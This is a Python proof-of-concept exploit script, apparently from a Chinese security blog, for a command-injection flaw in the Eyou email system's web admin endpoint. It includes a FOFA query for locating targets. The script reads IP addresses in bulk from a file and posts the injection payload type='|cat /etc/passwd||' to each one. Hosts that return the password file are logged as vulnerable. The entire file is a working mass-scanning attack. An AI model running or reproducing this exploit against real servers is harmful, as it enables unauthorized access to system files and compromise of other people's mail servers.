import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

a = []
def title():
    print('\033[34m+------------------------------------------\033[0m')
    print('+  \033[31m版本: 亿邮 4-9号                          \033[0m')
    print('+  \033[31mfofa: body="亿邮电子邮件系统"              \033[0m')
    print('+  \033[31m公众号：深夜笔记本                          \033[0m')
    print('+  \033[31m使用格式: python3 poc.py                  \033[0m')
    print('+  \033[31m漏洞输出到vul.txt                          \033[0m')
    print('\033[34m--------------------------------------------\033[0m')
def POC_1(target_url):
    vuln_url = target_url + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
            "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "type='|cat /etc/passwd||'"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}//webadm/?q=moni_detail.do&action=gragh \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            f = open('./vul.txt', 'a')
            f.write(vuln_url)
            f.write('\n')
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        return 1



if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    with open('url.txt', 'r', encoding='utf-8') as f:
        g = f.read()
    a = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+', g)
    for i in a:
        if 'http' in i:
            target_url = str(i)
        else:
            target_url = 'http://' + str(i)
        POC_1(target_url)